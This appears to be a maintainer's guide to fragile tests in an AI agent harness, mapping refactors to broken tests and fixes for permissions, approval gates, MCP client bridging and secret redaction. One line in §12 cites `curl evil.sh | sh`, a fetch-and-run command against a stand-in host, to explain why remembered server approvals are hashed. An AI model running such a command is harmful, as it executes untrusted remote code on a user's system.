# Breaking Changes — Fragile Mock Points in the Test Suite

This file documents why each fragile test in this suite breaks, and what
the fix is expected to be when a planned refactor touches the surface
the test mocks against.

Read this BEFORE updating a failing test that mentions this file in its
docstring. A failure here usually signals a real design change upstream
worth understanding, not a flaky mock to patch over.

---

## 1. `test_orchestrator.py` — the most fragile mock in the suite

This file mocks `RunAgentLoop.run_deep_research_mode` keyed by `pass_id`
strings ("Pass 0", "Pass 3a", "Final synthesis", ...). The orchestrator
calls `_run_pass(pass_id, ...)`, which in turn calls
`run_deep_research_mode(pass_id=pass_id, ...)`. Mocks intercept at the
`run_deep_research_mode` boundary, NOT `_run_pass`, so anything that
refactors `_run_pass`'s *internals* doesn't break this test.

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Rename a pass (e.g. "Pass 3a" → "Grounding") in `orchestrator.py` and `system_prompts.py` | `AssertionError: orchestrator called an unexpected pass_id 'Grounding'` | Update the keys in `_canned_pass_responses` in the test to match the new pass_id strings |
| Change the JSON SHAPE a pass returns — e.g. Pass 2 claims growing an `asserted_by_candidates` field | The orchestrator's `_claim_from_json` filters unknown fields silently (via `_CLAIM_INPUT_FIELDS` allowlist), so this *doesn't break* the test until a required field is added | If a NEW required field is added to `_CLAIM_INPUT_FIELDS`, include it in the canned Pass 2 mock payloads |
| Add a new pass between existing passes | `AssertionError` on pass-order assertion (the `call_log == expected_order` check) | Add the new pass_id to `_canned_pass_responses` (with its expected JSON shape), insert into the expected pass order list in tests |
| Change the Trace line *format* (e.g. `Pass 0: plan produced (X entities)` → `Pass 0 produced X-entities`) | The `test_pipeline_trace_contains_expected_lines_in_order` test uses `startswith()` against prefix strings like `"Pass 0:"` | Update the `expected_pass_starts` list in that one test to match the new format |
| Refactor `_run_pass` → `_run_pass_with_json_retry` (ROADMAP §3) | Should NOT break this test, since the mock is on `run_deep_research_mode` not `_run_pass` | If the refactor changes which ENTRYPOINT the orchestrator calls (e.g. starts calling `_run()` directly per ROADMAP §3's "alternative"), the mock target needs to change |
| Add a new kwarg to `RunAgentLoop.run_deep_research_mode` (e.g. `temperature=None` per ROADMAP §10) | `TypeError: side_effect() got an unexpected keyword argument 'temperature'` | The `_build_pass_mock` side_effect already accepts `**kwargs` to swallow these, so this should NOT break. If it does, re-audit that signature. |

### The expected update pattern after ROADMAP §3 (Malformed-JSON recovery)

ROADMAP §3 refactors `_run_pass` into `_run_pass_with_json_retry` which
keeps appending retry messages to the SAME pass's thread. If the
implementation chooses to keep using `_run_pass` as the inner call
(with retry wrapping it externally), `test_orchestrator.py` is
unaffected — the mock still intercepts `run_deep_research_mode` calls
between `_run_pass` and the SDK. If the implementation instead reaches
into `RunAgentLoop._run()` directly (ROADMAP §3's "alternative"), the
mock target in `_build_pass_mock` needs to switch from
`RunAgentLoop.run_deep_research_mode` to `RunAgentLoop._run`.

### The retry-loop test specifically

`test_pipeline_6a6c_retry_loop_continues_until_max_retries_then_fallback`
hard-codes `MAX_RETRIES = config.MAX_PIPELINE_RETRIES`. If the retry
mechanic goes through ROADMAP §3's JSON-retry (a separate retry cap
inside _run_pass_with_json_retry), the count semantics change: the
orchestrator's outer retry loop still uses `MAX_PIPELINE_RETRIES`, but
inner JSON-retry attempts add extra `run_deep_research_mode` calls per
outer attempt. The test would need to multiply the canned 6a/6c
responses by the new retry factor.

---

## 2. `test_loop_stop_conditions.py` & `test_loop_tool_dispatch.py`

These mock `core.loop.call_model_stream` and `core.loop.registry.dispatch`
directly, both as top-level references inside `core/loop.py`.

**§13 generator conversion:** `_run()` is now a generator yielding
`LoopEvent` objects. Tests wrap it in `run_to_completion()` and mock
`core.loop.call_model_stream` (via `make_stream_from_response` from
`tests/conftest.py`) instead of `core.loop.call_model`. The mock target
changed from `core.loop.call_model` to `core.loop.call_model_stream`.
Any test that still patches `core.loop.call_model` will fail with
`AttributeError: module 'core.loop' has no attribute 'call_model'`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename or move `call_model_stream` (e.g. refactor into a different module) | The mock target `core.loop.call_model_stream` no longer exists; tests pass through to real `call_model_stream` and fail (no fake client) | Update the mock target path in both files |
| Add a new parameter to `_run()` (e.g. `tool_context` per ROADMAP §15) | `TypeError: _run() got an unexpected keyword argument` only if tests pass it; tests today use `_build_run_kwargs` / `_make_run_kwargs` so they only pass what's listed | If `_run` grows a required positional parameter (unlikely), update the kwargs builders |
| Change the `stop_reason` strings (e.g. "max_steps_reached" → "MAX_STEPS") | Direct `assert response.stop_reason == "complete"` fails | Update the string literals in the assert statements; these strings are deliberately stable per ARCHITECTURE.md §4.8 so changes here are intentional and warrant a ROADMAP update too |
| Change `_run`'s tool_gate behavior to skip the `error: not available in this context` early branch | `test_disallowed_tool_name_skips_dispatch_and_feeds_error_result` still passes IF the new behavior also avoids dispatching, fails if it dispatches | Audit the new behavior; either update the assertion expectations OR flag the change as a regression of the "tools not allowed in this context" guarantee |
| Remove `run_to_completion()` or change its import path | Tests that call `run_to_completion(RunAgentLoop._run(...))` fail with ImportError | Update the import; `run_to_completion` lives in `core/loop.py` per §13's decision |
| Change `LoopEvent` field names | Tests that inspect events directly (test_streaming_loop.py) fail on attribute access | Update field names in both production and test code |

---

## 3. `test_client_translation.py`

Mock-free pure-translation tests; should be robust.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Add Google's `_tools_for_provider` / `_messages_for_provider` implementation (ROADMAP §9) | `test_tools_google_not_implemented` and `test_messages_google_not_implemented` FAIL because NotImplementedError no longer raises | Delete or rewrite those two tests against the new translation behavior; verify the new behavior matches the SymPy/Content structures Google's SDK expects |
| Change Anthropic's tool_result batching (one user message with N tool_result blocks) — e.g. Anthropic releases a new API version that wants one message per result | `test_messages_anthropic_consecutive_tool_results_batch_into_one_user_message` fails | Update the test to assert the new shape; this is a deliberate API contract change and ARCHITECTURE.md §4.7 should be updated alongside |
| Change OpenAI's `tool_calls.function.arguments` JSON encoding shape | `test_messages_openai_assistant_with_tool_calls_serializes_arguments_as_json` fails | Either the production change is wrong (revert it) or the test expectation is wrong (update it) — verify which by re-reading ARCHITECTURE.md §4.7 load-bearing diffs |

---

## 4. `test_memory_write_through.py`

This file's tests assert the CURRENT (lossy) resume behavior — assistant
entries are persisted as the full rich dict under storage's `content`
column, and `get_session_history` returns them nested under `content`
rather than restored to their original top-level shape.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Re-fix the assistant-shape lossy-resume bug (e.g. make storage.get_session_history reconstruct the poison-neutral shape) | Tests in `test_resume_existing_thread_loads_messages_from_storage` that assert `second.messages[1]["content"]["text"] == "Hi there"` need rewriting to assert `second.messages[1]["text"] == "Hi there"` (top-level keys returned, not nested) | This is a desirable fix. Update those tests to assert the now-uniform shape. The asymmetry note at the top of the file should also be removed/replaced. |
| Reintroduce `from core.storage import ...` in `core/memory.py` | `test_core_memory_import_succeeds` fails with an ImportError mentioning `core.storage` | Revert the import to `from storage import ...` per ARCHITECTURE.md §11 |
| Change `add_assistant_message` to take a different argument (e.g. raw SDK object instead of normalized ModelResponse) — ARCHITECTURE.md §4.6 explicitly forbids this | `test_add_assistant_message_appends_and_save_uses_neutral_shape` fails because it builds a `ModelResponse` to pass in | This is a regression of the §4.6 contract; flag and revert, do NOT update the test to pass SDK objects |

---

## 5. `test_registry_permissions.py`

Mock-friendly: monkeypatches `is_tool_allowed` and `requires_approval`
at the `tools.registry` module namespace. Independent of config defaults.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| `registry.dispatch` adds a new step (e.g. `check_output_policy` from ROADMAP §8) | Tests still pass — they only verify policy enforcement, not the post-call content filter | If you want post-call coverage too, add a new test; don't modify existing ones |
| Add a `core/loop.py` integration that uses a different exception class instead of `ToolCallDenied` | `test_loop_tool_dispatch.py::test_registry_dispatch_raises_ToolCallDenied_caught_and_recorded_as_error` fails | Update the import in that test from `ToolCallDenied` to the new class |
| Change `ToolCallDenied`'s message wording (e.g. "approval" → "consent") | String assertions like `"approval" in result["error"].lower()` may fail | Update the substring checks; keep them loose (lowercase substring) so wording can drift without rewriting tests |

---

## 6. `test_math_tools.py`

Stable across SymPy version drift (uses symbolic equivalence, not string
equality).

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename any tool's operations (e.g. "dot_product" → "dot") | Tests pass operation names directly to `run({"operation": "..."})`; will raise a pydantic ValidationError | Update the operation string in the relevant test |
| Change the param model field names (e.g. `vector_a` → `first_vector`) | ValidationError: missing field | Update the param dict in the affected test |
| Make `safe_parse` not raise on injection payloads (e.g. accidentally leave `__builtins__` in the namespace) | `test_safe_parse_blocks_dunder_import_injection` may or may not catch it (depends on whether the payload actually executes) — this is a SECURITY regression. Treat any change to `_SAFE_GLOBALS` in `_math_common.py` as a security-sensitive diff and audit before merging. | Do NOT update the test to "make it pass". The test is correctly asserting a security invariant; the production code must change. |
| Bump SymPy major version | Symbolic equivalence (`sympy.simplify(a - b) == 0`) should hold; minor serialization drift is absorbed by the equivalence check | If a major version introduces a different `Matrix.dot` return type for matrix-vs-vector or changes integer behavior, audit and update expectations |

---

## 7. `test_confidence_scoring.py`

Pure-function tests against `score_claim`. Stable by design; the formula
is manually maintained in `confidence_scoring.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Adjust `TIER_THRESHOLDS` (e.g. the LOW cutoff moves from 0.3 to 0.25) | General coverage tests (`test_partial_grounding_factual_lands_medium`, `test_synthesis_above_cap_drops_tier_when_penalized`) may land in different tiers | Update the expected tier in those assertions; the three ROADMAP-required regression tests (HIGH, UNVERIFIED, cap-swallows-penalty) should remain valid REGARDLESS of threshold tuning — if any of those three break, the formula change is a real regression of the regression-guarded invariant |
| Move the cap from `NON_FACTUAL_SCORE_CAP = 0.65` to a different threshold | The cap-before-penalty regression test still passes IF the cap is applied before penalty (the regression test only checks the GAP between clean and flagged claims is exactly `ASSUMPTION_FLAG_PENALTY`, regardless of where the cap sits); the general test `test_synthesis_above_cap_drops_tier_when_penalized` may break depending on new cap value vs flag count arithmetic | Re-audit the general tests against the new cap value; the regression test should keep passing if the formula invariant holds |
| Apply ensemble-mode scoring (ROADMAP §10) — adds a `consistency_score` term and takes `ensemble_n` as a parameter | All five tests still pass: they call `score_claim(claim)` with the default (no ensemble_n), which falls into the unchanged non-ensemble branch | If ensemble-n becomes a required parameter (no default), update tests to pass `ensemble_n=0` explicitly |

---

## 8. `test_pipeline_storage.py` & the §5 persistence schema/status

These tests exercise `core/reasoning/pipeline_storage.py`
(`create_pipeline_run` / `update_pipeline_run` / `load_pipeline_run`)
against the upgraded fake sqlmodel, plus the orchestrator's failure-path
persistence wrap and per-pass checkpointing.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename a `PipelineRunRecord` column (`claims_json` / `trace_json` / `coverage_gaps_json` / `final_report`) or change its type | `test_update_pipeline_run_on_complete_marks_complete_and_stores_columns` and `test_load_pipeline_run_round_trips_all_fields` fail with `AttributeError` on the record, or a `json.loads` mismatch | Update the column name/type in both the write and read assertions; keep the separate-columns convention (do NOT collapse back into one blob — see DEVLOG §3.4 for why) |
| Change the `status` literals (`running` / `complete` / `failed`) | `test_..._marks_complete...` and the orchestrator failure/success-path tests fail on the status assertion | Update the literal in both `pipeline_storage.py` (terminal check) and the tests. `complete` is deliberately aligned with `ModelResponse.stop_reason`'s `"complete"` — don't drift it back to `succeeded` |
| Change `update_pipeline_run`'s serialization (e.g. `vars(c)` → `asdict(c)`, or add a field to `Claim`) | The `claims_json` round-trip assertion may change shape | Per the migration note on `Claim` in `base.py`: if a nested-dataclass field is added, migrate EVERY `vars(c)` site (orchestrator passes + `pipeline_storage`) to `asdict(c)` together, then update the test's expected claim dict |
| Change the inner-failure logging in `orchestrator.py`'s except block (the `logger.error(...)` call) | `test_inner_storage_failure_propagates_original_exception_and_logs_run_id` fails — either the original exception is masked (real regression) or the run_id no longer appears in the log message | The invariant: the ORIGINAL pipeline exception must propagate, and the persistence failure must be logged at ERROR naming the `run_id`. Restore both before touching the test |
| Add/remove a `load_pipeline_run` return field | `test_load_pipeline_run_round_trips_all_fields` fails on a missing/extra key | Update the assertion to match the new return shape. The 9-field contract (id, user_query, status, started_at, finished_at, claims, trace, coverage_gaps, final_report) is documented in `pipeline_storage.py`'s docstring |
| Remove or relocate a per-pass `update_pipeline_run(run.run_id, run)` checkpoint in `orchestrator.py` | `test_crash_after_pass_3b_leaves_claims_populated_via_load` or `test_hard_kill_bypasses_except_block_checkpoint_survives` fails — claims or trace are empty/incomplete after a mid-pipeline crash | Restore the checkpoint after the affected `run.log(...)` call. The invariant: every `run.log(...)` (except "Final synthesis complete.", which is subsumed by the terminal update) is followed by a data-only checkpoint. See DEVLOG §5.1 for the full 16-site list |
| Change `test_pipeline_success_marks_run_complete`'s status assertion back to `statuses_seen == ["complete"]` | The test fails because per-pass checkpoints add `None`-status calls before the terminal `"complete"` | The correct assertion: last call is `"complete"`, all preceding are `None`, and at least one `None` exists. See DEVLOG §5.6 |

---

## 9. `test_cli.py` — parser defaults, trust flow, and prompt assembly (§14)

§14 changed `main.py`: `--provider`/`--model` now default to `None` and
resolve AFTER parsing via `resolve_runtime_defaults()` (CLI >
settings.json > config.py), a `--trust-project` flag was added, and
startup runs `_ensure_workspace_trust()` + `config_loader.initialize()`.
System prompts now assemble through
`prompts.system_prompts.with_skill_catalog()` / `pass_prompt()`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Move parser defaults back to argparse-level constants (`default=DEFAULT_PROVIDER`) | `test_build_parser_defaults` fails (asserts `None`) | The `None` defaults are load-bearing: argparse fill-in must be distinguishable from an explicit CLI choice or settings.json can never win. Resolution lives in `resolve_runtime_defaults()` |
| Rename a known settings.json key | `test_resolve_runtime_defaults_precedence` fails | Update the dict keys; the known-key schema lives in `core/config_loader.py::_KNOWN_SETTINGS` and must change in the same commit |
| Change the non-TTY notice wording | `test_trust_non_tty_skips_without_hanging` asserts the notice mentions `--trust-project` | Keep the flag name in the notice (it is the remediation the user needs); the flag itself is user-facing CLI surface and should not be renamed casually |
| Change `describe_project_content()` so settings.json is no longer shown verbatim | `test_trust_prompt_shows_settings_contents` fails | The verbatim display is the informed-consent amendment (DEVLOG §14): a project's settings can pick the provider and multiply pipeline cost, so approval must show them. Restore verbatim display |
| Assert exact system-prompt text passed to `_run()` in any test | Prompt gains an appended `## Available skills` catalog whenever `config_loader` was initialized with skills present | The autouse `clear_config_loader_state` fixture (tests/conftest.py) resets the cache between tests; only `initialize()` with skills inside a test that wants the catalog |
| Move `pass_prompt()`/`with_skill_catalog()` out of `prompts/system_prompts.py` | `test_load_skill.py` prompt-assembly tests fail on import | Keep both there; the §3 JSON-retry path and `run_deep_research_mode` must share one assembly point so the catalog cannot diverge between an attempt and its retry |

---

## 10. Permission signatures, `ToolContext`, and advertised schemas (§15)

§15 added an optional `ToolContext` to every permission entry point and
replaced `_run()`'s `allowed_tools` list with it. Three signatures
changed, and one behavioural default changed with them.

**Signatures:** `is_tool_allowed(name, context=None)`,
`requires_approval(name, params, context=None)`,
`ToolRegistry.approval_needed(name, params, context=None)`,
`ToolRegistry.dispatch(name, params, context=None, approval_callback=None)`,
`ToolRegistry.schemas(context=None)` (was `schemas(tool_names: list[str])`),
`RunAgentLoop._run(..., context, ...)` (was `allowed_tools`).

**Behaviour:** `schemas()` now returns only tools that pass
`is_tool_allowed(name, context)` and any `ToolSpec.available_check`. Under
default config that is 11 of 16 registered tools.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Monkeypatch `tools.registry.is_tool_allowed` / `requires_approval` with a lambda taking the OLD arity | `TypeError: <lambda>() takes N positional arguments but N+1 were given` | Add `context=None` to the stub. `mocker.patch(..., return_value=X)` is unaffected — it ignores arity, which is why `test_policy_enforcement.py` survived untouched |
| Define a `fake_dispatch(name, params, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'context'` — the loop always passes `context=` | Add `context=None` to the stub signature |
| Assert `dispatch.assert_called_once_with(name, params)` | Fails: actual call is `(name, params, context=None)` | Include `context=None` (or the ToolContext under test) in the expectation |
| Move the approval OR-composition out of `approval_needed()` and back into `dispatch()` | `test_loop_tool_dispatch.py::test_context_is_forwarded_to_dispatch_and_approval_needed` and the AC3 tests still pass, but the loop's permission bridge silently diverges from dispatch | **Do not.** `approval_needed()` is the single source of truth §13 created and §15 extended; the two callers must compute approval from the same code. See DEVLOG §15.3.1 — the ROADMAP sketch gets this wrong because it predates §13 |
| Make a tool's `approval_check` REPLACE `requires_approval()` again instead of OR-ing with it | `test_ac3_context_false_does_not_suppress_tool_approval_check` and `test_approval_check_false_still_consults_config_and_context` fail | This is the specific regression §15 exists to close: an either/or makes agent `approval_overrides` silently inert for `read`/`write`/`edit`/`shell` — the four tools where per-agent tightening matters most |
| Let a context re-enable a globally disabled tool (reorder the AND so the context is checked first, or make `allowed_tools` additive) | `test_ac1_*` fail | The global check is unconditional and first, by design. Agent definitions can come from a merely-trusted project directory; none may hand themselves a capability the user turned off |
| Give `approval_overrides` three-state semantics so `False` can suppress approval | `test_ac3_*` fail | Under OR, `False` is indistinguishable from absent — that asymmetry IS D14. A context may tighten, never loosen |
| Drop `check_output_policy()` from `dispatch()` while refactoring it | `test_ac5_check_output_policy_still_runs_on_dispatched_results` fails | Restore it. §15's own Rev. 2 sketch omitted this line; written as sketched it would have deleted ROADMAP §8's secret redaction in the section about tightening permissions |
| Drop the unknown-tool `ValueError` guard from `dispatch()` | `test_ac7_*` fail with `KeyError` | Restore it. It matters MORE since §15, not less: runtime `unregister()` (D15) makes a stale tool name a reachable state rather than a programmer error |
| Register a tool without adding fields to BOTH `config.ToolPermissions` and `config.ToolApprovals` | `RuntimeError` at `import tools.registry` — the ENTIRE suite fails to collect, not one test | Intended (D24). Add the two boolean fields. `mcp__*` names are exempt |
| Add a tool that should not always be advertised | It appears in every `schemas()` call | Give its `ToolSpec` an `available_check` predicate, as `load_skill` does. Do not special-case it inside `schemas()` — the registry owns mechanism, not policy |
| Flip `read`/`write`/`edit`/`shell` to permission `True` in `config.py` | `test_schemas_omits_globally_denied_tools_from_the_real_registry` fails | Expected — the test pins the shipped default. Update it deliberately, in the same commit as the config change |
| Call `registry.schemas(["a", "b"])` with a name list | `AttributeError` on `.allowed_tools`, or a silently empty result | The list parameter is gone. Pass `ToolContext(allowed_tools={"a", "b"})` — one representation of "which tools may run", not two |

---

## 11. TUI pilot tests, reasoning effort, and the sampling gate (§16)

§16 added `tui/`, an `effort` parameter threaded from the TUI to the provider
payload, and a gate that drops sampling parameters on models that reject
them. Three new test files: `test_tui.py`, `test_client_effort.py`,
`test_ensemble_guard.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Revert `run_worker(..., exit_on_error=False)` to Textual's default | `test_ac3_exception_in_a_tool_does_not_terminate_the_app` fails, and it fails by tearing down the whole test app — the output is a full Textual crash dump, not an assertion | Restore it. The default kills the app on any transient worker exception. `on_worker_state_changed` is required alongside it or the error is reported nowhere |
| Make a permission dismissal path not put a boolean on the channel (return early, dismiss with `None`, drop the `put`) | The AC2 tests **hang** rather than fail — the worker blocks forever on `queue.get()`. Under a timeout they show as a killed run | Every dismissal path, including Escape, must resolve to a boolean. This is why the AC2 tests assert on the dispatched tool: a modal that renders and drops the answer looks identical to one that works, right up until it doesn't |
| Restart or re-enter the generator on approval instead of resuming it | `test_ac2_approving_...` fails on the dispatch assertion — a fresh generator re-issues the model call and never reaches the tool | Resume. `permission_channel` exists (§13) so the SAME generator continues |
| Add `asyncio_mode = auto` to `pytest.ini` | Nothing breaks immediately, but ARCHITECTURE §4.13's "no asyncio in pytest.ini" stops being true | Not needed — TUI tests carry explicit `@pytest.mark.asyncio`. `--strict-markers` accepts it because pytest-asyncio registers the marker |
| Change `call_model_stream`'s positional parameter order | `test_effort_reaches_the_model_call` asserts `call_args[0][7] == "high"` | Update the index, or switch the assertion to a keyword — but keep asserting on the *call arguments*, not on the raven: the indicator can be right while the parameter never leaves the UI |
| Make `effort=None` send something on any provider | `test_no_effort_sends_nothing_on_every_provider` fails | Silence is the only universally safe value: `reasoning_effort` is rejected by OpenAI-compatible non-reasoning models, adaptive thinking by pre-4.6 Anthropic models. Opt-in is what keeps §16 from changing every existing caller's behaviour |
| Tabulate Anthropic effort levels instead of querying | `test_anthropic_levels_come_from_the_api_not_a_table` fails (it uses a model name absent from every table) | Query. The entire point is that a newly released Anthropic model needs no entry in this repo |
| Query a non-Anthropic provider for capabilities | `test_non_anthropic_uses_the_table_without_querying` fails the client stub deliberately | No OpenAI-compatible provider in `providers.json` exposes a capability endpoint |
| Send `ThinkingConfig(thinking_budget=...)` unconditionally on Google | `test_google_effort_tracks_what_the_installed_sdk_can_express` fails; against the real pinned SDK it is a `TypeError` | The pinned `google-genai==1.0.0` has no such field. Keep the `_google_supports_thinking_budget()` gate, or move the pin deliberately — which also puts §9's Google implementation back in scope for retest |
| Drop the sampling parameter silently instead of logging | `test_sampling_dropped_for_models_that_reject_it` fails on the caplog assertion | Warn. A silent drop is how ensemble mode came to look like it worked |
| Make the ensemble guard warn-and-continue instead of raising | `test_ensemble_on_a_sampling_rejecting_model_raises_before_any_work` fails | Raise. Continuing produces N identical candidates and reports maximal cross-candidate consistency for all of them — an expensive wrong answer, not a degraded one |
| Change `config.MODEL_NAME` to a model that accepts sampling params | `test_default_model_is_in_the_reject_set` fails | Intended as a deliberate signal: update the test in the same commit, having checked the new default really does accept them |
| Change `config.MAX_TOKENS` | Nothing fails — `test_call_model_google_text_only` asserts against the setting, not a literal | That test used to hardcode 4096 and broke when §16 raised it. Assert against the setting for tunables |
| Add a settings key without adding it to `_KNOWN_SETTINGS`/`_KNOWN_TUI` | `ValueError: unknown tui key` at load | Intended (§14 amendment 1). A preference the loader doesn't know about is a startup error, not a silently ignored line |
| Add a nested settings section without adding it to `_NESTED_SETTINGS` | It validates as a bare `dict` and **shallow-merges** across tiers — a project setting silently discards the user's sibling keys | Register it in `_NESTED_SETTINGS`; both the validator and the deep-merge iterate it. Hardcoding the section name in two places is what produced review finding F2 |
| Remove `ThinkingConfig` from the Google fake in root `conftest.py` | Every Google effort test errors on a missing attribute | The real SDK has it. A fake missing what production provides is the double drifting, not the code being wrong |

---

## 12. MCP client, the async bridge, and tier precedence (§17)

§17 added `mcp_client/`, made redaction recursive, flipped user/project tier precedence, and made
MCP tools approval-gated by default. Two new test files: `test_mcp_client.py`,
`test_mcp_config.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Collapse the `_manager()` task back into `connect_all()` entering the stack and `disconnect_all()` closing it (what §17's spec sketches) | `test_disconnect_all_unwinds_without_a_cancel_scope_error` fails with `RuntimeError: Attempted to exit cancel scope in a different task than it was entered in` in the log | Restore the manager task. anyio binds cancel scopes to the TASK, and `run_coroutine_threadsafe()` creates a new one per call — being on the right *loop* is not enough. Note the test asserts on the **log**, not on `raises`: `disconnect_all()` swallows exceptions, so a "does not raise" assertion here is unfalsifiable |
| Drop `read_timeout_seconds` and rely on `future.result(timeout=)` alone | `test_ac4_a_hanging_tool_times_out_via_the_protocol_not_the_caller` fails on elapsed time | Keep both. The protocol timeout cancels the request; the future timeout only stops waiting. Assert on **which one fired**, not on "an error came back" — both paths return an error, which is what made the first version of this test vacuous |
| Rename a package to `mcp/` | Everything fails at import: `import mcp` resolves to the local package | It must stay `mcp_client/`. The project root is on `sys.path` |
| Read `.structuredContent` / `.isError` (v1 spellings) | `test_normalize_reads_v2_snake_case_field_names` fails | v2 is snake_case. Reading v1 names against v2 doesn't crash — `getattr` returns `None`, so **every failed call silently looks successful**, the worst available shape |
| Move the `mcp` pin below 2.0 | Import errors (`MCPError`, `Client`) plus silent field mismatches | Re-verify in hand before moving it, per D22. That instruction is why §17 shipped against v2 instead of a spec written for v1 |
| Revert `_redact_value` to top-level strings only | 2 tests in `test_policy_enforcement.py` and `test_ac6_secret_in_mcp_output_is_redacted_by_the_existing_layer` fail | Keep the recursion. `structured_content` is arbitrary third-party JSON arriving under `result` as a dict; scanning only top-level strings leaves the highest-risk output unscanned |
| Restore `_tier_dirs` to `[harness, project, user]` | `test_user_wins_over_project` and `test_f3_user_over_project_collision_warns` fail | D29 inverted it deliberately. Harness stays first (D18) |
| Implement D29 as "only the user tier loads" | `test_non_colliding_definitions_from_both_tiers_all_load` fails | Precedence breaks same-name ties only; `_discover()` accumulates a union |
| Express `autoApprove` as a `ToolSpec.approval_check` instead of a base default | `test_d28_auto_approve_server_does_not_require_approval` fails | `approval_needed()` ORs approval_check in, and OR can only tighten — an opt-out there is inert. Vary the base default via `set_dynamic_approval_default` |
| Make `_default_for_unknown_approval` return False for `mcp__*` | `test_d28_mcp_tools_require_approval_by_default` fails | Allowed-by-default and trusted-by-default are different questions |
| Add a try/except-free `_connect_all_async` | `test_a_failing_server_is_named_and_skipped_without_stopping_the_others` fails | One stale entry must not make the harness unusable |
| Move project `mcp.json` back to the project root | `test_project_mcp_json_lives_under_dot_venastine` fails | At the root it sits outside D17's hash, and `is_trusted()` returns True when `.venastine/` is absent |
| Key the acknowledgement store by name only | `test_editing_the_command_makes_a_remembered_server_unknown_again` fails | Hash the entry. Otherwise approving `npx pkg` silently carries to `curl evil.sh \| sh` under the same name |
| Stub `mcp` in the root `conftest.py` like the other six SDKs | The bridge tests stop testing the bridge | Deliberate exception. v2's in-memory transport is offline already, and a fake cannot reproduce anyio's cancel scopes — the bug that shaped this design |

---

## 13. Agent system: dispatch injection, headless callability, goal mode (§18)

§18 added `parent_run` to `dispatch()`, signature-inspection injection of
`parent_context`/`parent_run` into handlers that declare them, the
headless callability filter (`schemas(callable_only=...)` +
`headless_hidden()`), `ConversationMemory.extra`/`set_extra`, and the
`system_prompt=` kwarg on `run_agent_conversation`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Define a `fake_dispatch(name, params, context=None, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'parent_run'` / `'permission_channel'` — the loop always passes both now | Add `parent_run=None, permission_channel=None` to the stub signature |
| Assert `dispatch.assert_called_once_with(name, params, context=X)` | Fails: actual call also carries `parent_run=RunInfo(...)` and `permission_channel=` | Add `parent_run=ANY, permission_channel=None` to the expectation |
| Assert `approval_needed` was called exactly once per tool call | Fails: §18's headless filter consults it at schema time too | Assert every call received the same context (`call_args_list`), not a count — see `test_context_is_forwarded_to_dispatch_and_approval_needed` |
| Spy/fake `ConversationMemory` lacking `.extra` | `AttributeError: ... no attribute 'extra'` from `with_goal()` | Add `self.extra = {}` to the double (and `set_extra` if it is exercised) |
| `FakeStorage.get_thread` returning a bare truthy sentinel | NOT an `AttributeError`: `ConversationMemory.__init__` reads `extra_data` defensively via `getattr`, so the thread silently gets an empty `.extra` and the failure surfaces LATER as a missing `## Persistent objective` section | Return an object carrying `extra_data` (the fake now mirrors the real row); keep `None` for unknown ids |
| Rename the `## Persistent objective` marker or move goal assembly out of `core.loop.with_goal` | `test_goal_persists_and_injects_into_prompt` fails | The marker lives in `with_goal()` so the CLI wrapper and TUI worker cannot drift; keep both calling it |
| Make `child_context` a union instead of an intersection | `test_ac1_*` fail | C6: intersection, never union — a restricted parent must not escape via a permissive child |
| Remove the `callable_only` drop from `schemas()` | `test_headless_filter_hides_approval_gated_mcp_tool` fails | The headless rule is the §15-17 finalization: uncallable-without-a-channel tools are not advertised, and `headless_hidden()` feeds the once-per-process WARNING |
| Register a dynamically-named probe tool without the `mcp__` prefix in dispatch tests | `ToolCallDenied: ... disabled by policy` | Unknown non-`mcp__` names are denied by design; use `mcp__*` names for probes (allowed by default, approval-gated, so pass an `approval_callback`) |

---

## General regeneration: when a production change breaks several tests at once

If a planned refactor (e.g. ROADMAP §3's JSON-retry, §10's ensemble mode)
breaks multiple tests across multiple files:

1. Read the planned change in ROADMAP.md to understand the NEW contract.
2. Update the canned/pinned values in tests to match the new contract,
   NOT to silently absorb the change.
3. If a regression test (the ROADMAP §4 "three verbatim cases") breaks
   on a planned refactor, that's a signal the refactor is changing a
   guarded invariant — STOP and re-evaluate the refactor against the
   original motivation for the invariant before updating the test.
4. Update this file to document the new break surface for the next
   maintainer.

---

## 14. §14–§18 review fixes

| If you change | You break | Fix |
|---|---|---|
| Remove `ToolSpec.grant_scope` or stop consulting it in `_run()` | `test_s1_grant_means_one_prompt_per_turn_not_per_spawn` | The §18 sign-off asks once per RUN, not per call. The loop learns which tools work that way from `registry.grant_scope()`, never by name |
| Remove `ToolSpec.approval_notice` or the `notice` key on `permission_request` | `test_permission_channel_yields_request_and_dispatches_on_approval` | The event carries `notice` (often `None`). It is what tells the user what approving a spawn actually authorises |
| Add a name to `_INJECTABLE_PARAMS` without adding it to `dispatch()`'s injection map | `KeyError` at dispatch time | Deliberate. The previous ternary silently injected `parent_run` under any third name |
| Make `child_context` replace rather than union `approval_overrides` | `test_s2_parent_approval_tightenings_reach_the_child` | S2: approval composes like tool access. Only `True` entries carry |
| Stop forwarding `permission_channel` from `spawn_subagent` | `test_spawn_forwards_the_channel_and_the_grant` | Without it the child runs headless and loses every approval-gated tool, including all MCP tools |
| Set `ToolApprovals.spawn_subagent = False` again | `test_spawn_subagent_permission_declared` | Approving the spawn IS the sign-off; without it there is nothing to grant against |
| `clear_dynamic_approval_defaults(prefix)` | `TypeError` — it takes exact names now | It over-matched: clearing `mcp__fs__read` also cleared `mcp__fs__read__x`. No-arg still clears all |
| `unregister_all` scanning by prefix again | `test_unregistering_one_server_leaves_a_prefix_sibling_intact` | Server `fs`'s prefix also matches server `fs__read`'s tools |
| Send `effort` without `effort_for()` | `test_run_validates_effort_against_the_model_it_is_about_to_call` | `_run()` is the single enforcement point; every path to the wire goes through it |
